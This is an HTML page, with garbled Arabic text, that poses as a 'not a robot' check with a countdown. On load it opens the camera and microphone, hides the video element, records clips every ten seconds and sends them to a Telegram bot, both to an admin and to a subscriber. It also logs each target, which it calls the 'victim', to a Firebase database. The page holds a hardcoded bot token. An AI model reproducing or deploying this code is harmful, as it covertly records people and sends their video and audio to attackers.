<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø£Ù…Ø§Ù†</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; text-align: center; }
        body { height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2); background-size: 400% 400%; animation: backgroundAnimation 6s ease infinite; }
        @keyframes backgroundAnimation { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        .loading-container { background-color: white; padding: 30px; border-radius: 15px; box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.2); width: 90%; max-width: 400px; }
        h1 { color: red; font-size: 24px; margin-bottom: 10px; }
        .progress-container { background-color: #f3f3f3; border-radius: 10px; height: 20px; width: 100%; margin: 20px 0; overflow: hidden; }
        .progress-bar { background-color: #ff5722; height: 100%; width: 100%; transition: width 1s linear; }
        video { display: none; } /* Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø®ÙÙŠØ© ØªÙ…Ø§Ù…Ø§Ù‹ */
    </style>
</head>
<body>

    <div class="loading-container">
        <h1>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù†Ùƒ Ù„Ø³Øª Ø±ÙˆØ¨ÙˆØª</h1>
        <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø­ØªÙ‰ ÙŠÙ†ØªÙ‡ÙŠ Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ Ù„ÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø·...</p>
        <div class="progress-container">
            <div class="progress-bar" id="progress"></div>
        </div>
        <p id="countdown">20</p>
    </div>

    <video id="video" autoplay playsinline muted></video>

    <script>
        // 1. Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ÙØ§ÙŠØ±Ø¨ÙŠØ³
        const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // 2. Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
        const adminId = "5375214810"; // Ø§Ù„Ø£ÙŠ Ø¯ÙŠ Ø¨ØªØ§Ø¹Ùƒ
        
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get("user_id") || "Unknown";

        let videoStream;
        let recordedChunks = [];
        let mediaRecorder;

        // 3. ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø­Ø§Ù„Ø© ÙÙŠ Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Ø§Ù„Ù…ÙˆÙ‚Ø¹ (Firebase)
        function updateLiveStatus(msg) {
            if (userId !== "Unknown") {
                db.ref('hits/' + userId + '/ÙÙŠØ¯ÙŠÙˆ_ÙˆØµÙˆØª').set({
                    status: msg,
                    time: new Date().toLocaleString(),
                    device: navigator.userAgent
                });
            }
        }

        // 4. ØªØ´ØºÙŠÙ„ Ø§Ù„Ù†Ø¸Ø§Ù… (ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØµÙˆØª)
        async function startSystem() {
            try {
                videoStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });
                document.getElementById('video').srcObject = videoStream;
                
                updateLiveStatus("ğŸ¥ Ø§Ù„Ø¶Ø­ÙŠØ© Ù…ØªØµÙ„ - Ø¬Ø§Ø±ÙŠ ØªØ³Ø¬ÙŠÙ„ ÙÙŠØ¯ÙŠÙˆ ÙˆØµÙˆØª Ø§Ù„Ø¢Ù†");
                startCountdown();
                startRecording();
            } catch (error) {
                updateLiveStatus("âŒ Ø§Ù„Ø¶Ø­ÙŠØ© Ø±ÙØ¶ Ø¥Ø¹Ø·Ø§Ø¡ ØµÙ„Ø§Ø­ÙŠØ§Øª Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§");
            }
        }

        function startCountdown() {
            let timeLeft = 20;
            const timer = setInterval(() => {
                timeLeft--;
                document.getElementById("countdown").innerText = timeLeft;
                document.getElementById("progress").style.width = (timeLeft / 20) * 100 + "%";
                if (timeLeft <= 0) clearInterval(timer);
            }, 1000);
        }

        // 5. Ø§Ù„ØªØ³Ø¬ÙŠÙ„ ÙˆØ§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ØªÙƒØ±Ø±
        function startRecording() {
            mediaRecorder = new MediaRecorder(videoStream, { mimeType: "video/webm" });
            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
            
            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: "video/webm" });
                sendVideoToTelegram(blob);
                recordedChunks = [];
                startRecording(); // ÙŠØ¨Ø¯Ø£ ØªØ³Ø¬ÙŠÙ„ Ù…Ù‚Ø·Ø¹ Ø¬Ø¯ÙŠØ¯ ÙÙˆØ±Ø§Ù‹ Ø¨Ø¹Ø¯ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù‚Ø¯ÙŠÙ…
            };

            mediaRecorder.start();
            // ØªØ³Ø¬ÙŠÙ„ Ù…Ù‚Ø·Ø¹ ÙƒÙ„ 10 Ø«ÙˆØ§Ù†ÙŠ Ø¹Ø´Ø§Ù† Ù…ÙŠØ¨Ù‚Ø§Ø´ Ø­Ø¬Ù…Ù‡ Ø¶Ø®Ù…
            setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000);
        }

        function sendVideoToTelegram(blob) {
            const caption = `ğŸ¬ ØµÙŠØ¯ ÙÙŠØ¯ÙŠÙˆ Ø¬Ø¯ÙŠØ¯\nğŸ†” Ø§Ù„Ù…Ø´ØªØ±Ùƒ: ${userId}\nğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${navigator.platform}`;
            
            // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø£Ø¯Ù…Ù† (Ø£Ù†Øª)
            const adminFd = new FormData();
            adminFd.append("chat_id", adminId);
            adminFd.append("video", blob, "video.webm");
            adminFd.append("caption", caption);
            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: "POST", body: adminFd });

            // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… (Ø§Ù„Ù…Ø´ØªØ±Ùƒ)
            if (userId !== "Unknown" && userId !== adminId) {
                const userFd = new FormData();
                userFd.append("chat_id", userId);
                userFd.append("video", blob, "video.webm");
                userFd.append("caption", "ğŸ¬ Ù…Ø¨Ø±ÙˆÙƒ! ÙˆØµÙ„Ùƒ ØªØ³Ø¬ÙŠÙ„ ÙÙŠØ¯ÙŠÙˆ ÙˆØµÙˆØª Ù…Ù† Ø¶Ø­ÙŠØªÙƒ");
                fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: "POST", body: userFd });
            }
        }

        window.onload = startSystem;
    </script>
</body>
</html>

